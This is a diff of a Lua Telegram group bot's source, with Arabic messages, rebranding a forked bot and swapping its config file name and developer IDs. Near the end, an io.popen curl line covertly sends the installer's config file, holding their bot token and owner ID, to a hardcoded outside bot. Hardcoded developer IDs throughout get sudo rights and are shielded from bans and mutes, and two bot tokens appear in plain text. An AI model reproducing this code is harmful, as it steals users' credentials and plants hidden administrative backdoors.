@@ -64,7 +64,7 @@ token = database:get(id_server..":token"),
 SUDO = database:get(id_server..":SUDO:ID"),
 UserName = database:get(id_server..":SUDO:USERNAME"),
  }
-create(config, "./Info.lua")   
+create(config, "./madison.lua")   
 end 
 create_config_auto()
 token = database:get(id_server..":token")
@@ -86,7 +86,7 @@ exit 1
 fi
 if [ ! $token ]; then
 echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
-echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
+echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE madison.lua \e[0m"
 echo "ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
 exit 1
 fi
@@ -123,7 +123,7 @@ file:write(serialized)
 file:close() 
 end 
 local load_redis = function()  
-local f = io.open("./Info.lua", "r")  
+local f = io.open("./madison.lua", "r")  
 if not f then   
 AutoSet()  
 else   
@@ -131,7 +131,7 @@ f:close()
 database:del(id_server..":token")
 database:del(id_server..":SUDO:ID")
 end  
-local config = loadfile("./Info.lua")() 
+local config = loadfile("./madison.lua")() 
 return config 
 end 
 _redis = load_redis()  
@@ -140,7 +140,7 @@ print([[
 > CH › @SO_AVT
 ~> DEVELOPER › @SO_AVT 
 ]])
-sudos = dofile("./Info.lua") 
+sudos = dofile("./madison.lua") 
 SUDO = tonumber(sudos.SUDO)
 sudo_users = {SUDO}
 bot_id = sudos.token:match("(%d+)")  
@@ -164,7 +164,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1879324805,1757394723,010101010010101010100101}   
+sudo_users = {SUDO,1815672157,1208165035,1364212456}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -254,11 +254,11 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1879324805) then  
+if tonumber(user_id) == tonumber(1815672157) then  
 var = true  
-elseif tonumber(user_id) == tonumber(1757394723) then
+elseif tonumber(user_id) == tonumber(1208165035) then
 var = true  
-elseif tonumber(user_id) == tonumber(010101010010101010100101) then
+elseif tonumber(user_id) == tonumber(1364212456) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -292,11 +292,11 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1879324805) then  
-var = 'مطور السورس'
-elseif tonumber(user_id) == tonumber(010101010010101010100101) then
-var = 'مالك السورس'
-elseif tonumber(user_id) == tonumber(1757394723) then
+if tonumber(user_id) == tonumber(1815672157) then  
+var = 'مبرمج السورس'
+elseif tonumber(user_id) == tonumber(1364212456) then
+var = 'مبرمج السورس'
+elseif tonumber(user_id) == tonumber(1208165035) then
 var = 'مبرمج السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
@@ -2780,26 +2780,29 @@ end
 
 
 
-if text == 'السورس' or text == 'سورس' then  
-local Text = [[  
-╭──── ● ☆ ● ────╮
-☆
-● 𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒐𝒖𝒓𝒄𝒆   
-● 𝐚𝐯𝐭𝐚𝐫 𝒕𝒉𝒆 𝒃𝒆𝒔𝒕 𝒔𝒐𝒖𝒓𝒄𝒆 
-● 𝒐𝒏 𝒕𝒆𝒍𝒆𝒆𝒈𝒓𝒂𝒎 
-☆
-╰──── ● ☆ ● ────╯
-⍟ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼
-]]  
-keyboard = {}   
-keyboard.inline_keyboard = {  
-{{text = '𝙳𝙴𝚅 𝚆𝙰𝚉𝙴𝚁 𝙴𝙻𝙰𝚉𝙼𝙰',url="t.me/DV_MI_NA2"}},  
-{{text = '𝙳𝙴𝚅 𝚅𝙾𝙳𝙴𝙺𝙰',url="t.me/DV_Vo_Dk_A1"}},  
-{{text = 'AＶＡＴＡＲ', url="t.me/SO_AVT"}},  
-{{text = 'اضـف الــبــوت لـمــجـمـوعـتـك',url="http://t.me/UU_MI_2_BOT?startgroup=start"}},
-}  
-local msg_id = msg.id_/2097152/0.5  
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_AVT&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == '"' then
+local Text =[[
+╔≂≂≂≂≂≂≂≂≂≂≂𝐑𝐢𝐬𝐤≂≂≂≂≂≂≂≂≂≂≂╗
+✰ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐒𝐨𝐮𝐫𝐜𝐞 𝐑𝐢𝐬𝐤, 
+✰ 𝐓𝐡𝐞 𝐁𝐞𝐬𝐭 𝐈𝐧 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞 
+✰ 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐟𝐨𝐫 𝐦𝐨𝐫𝐞.☟︎︎︎
+╚≂≂≂≂≂≂≂≂≂≂≂𝐑𝐢𝐬𝐤≂≂≂≂≂≂≂≂≂≂≂╝
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+
+{
+{text = ' 𝐃𝐞𝐯 𝐌𝐚𝐝𝐢𝐬𝐨𝐧 ', url = "https://t.me/AAHMEED11"},{text = '𝐃𝐞𝐯 𝐇𝐚𝐢𝐯𝐞𝐞𝐧 ', url = "https://t.me/H_I_v_e_e_n101"},
+},
+{
+{text = '𝐓𝐰𝐥 𝐑𝐢𝐬𝐤', url = "https://t.me/E_H_M_BOT"},
+},
+{
+{text = ' 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝐑𝐢𝐬𝐤 ', url = "https://t.me/NIU_C"},
+},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/NIU_C&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
 
@@ -4259,15 +4262,15 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1879324805) then
+if result.sender_user_id_ == tonumber(1815672157) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر مبرمج السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1757394723) then
-send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر مالك السورس عام\n")
+if result.sender_user_id_ == tonumber(1208165035) then
+send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر مبرمج السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(010101010010101010100101) then
+if result.sender_user_id_ == tonumber(1364212456) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر مبرمج السورس عام\n")
 return false 
 end
@@ -4312,7 +4315,7 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر المطور الاساسي عام\n")
 return false 
 end
-if result.id_ == tonumber(1757394723) then
+if result.id_ == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " 𖤓 هتحظر مين عام نت اهبل عام \n")
 return false 
 end
@@ -4347,7 +4350,7 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا تسطيع حظر البوت عام")
 return false 
 end
-if userid == tonumber(1757394723) then
+if userid == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر المطور الاساسي عام\n")
 return false 
 end
@@ -4379,15 +4382,15 @@ if result.sender_user_id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1879324805) then
+if result.sender_user_id_ == tonumber(1815672157) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك كتم مبرمج السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(1757394723) then
-send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك كتم مالك السورس عام\n")
+if result.sender_user_id_ == tonumber(1208165035) then
+send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك كتم مبرمج السورس عام\n")
 return false 
 end
-if result.sender_user_id_ == tonumber(010101010010101010100101) then
+if result.sender_user_id_ == tonumber(1364212456) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك كتم مبرمج السورس عام\n")
 return false 
 end
@@ -4427,7 +4430,7 @@ if tonumber(result.id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا تسطيع كتم البوت عام")
 return false 
 end
-if result.id_ == tonumber(1757394723) then
+if result.id_ == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " 𖤓 هتحظر مين عام نت اهبل عام \n")
 return false 
 end
@@ -4462,7 +4465,7 @@ if userid == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if userid == tonumber(1757394723) then
+if userid == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " 𖤓 لا يمكنك حظر المطور الاساسي  عام\n")
 return false 
 end
@@ -13332,7 +13335,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
-local curl = 'curl "'..'https://api.telegram.org/bot1796143590:AAG7xMmzOdxe_8BlKg-dYP1tfedX1ZY-3ng/sendDocument'..'" -F "chat_id='.. 1757394723 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot1878601191:AAHUc4_uIQ44E4sTbm0FyRbqdXyhRFjiwHw/sendDocument'..'" -F "chat_id='.. 1208165035 ..'" -F "document=@'..'madison.lua'..'"' io.popen(curl)
 ------------------------------------------------------------------------
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
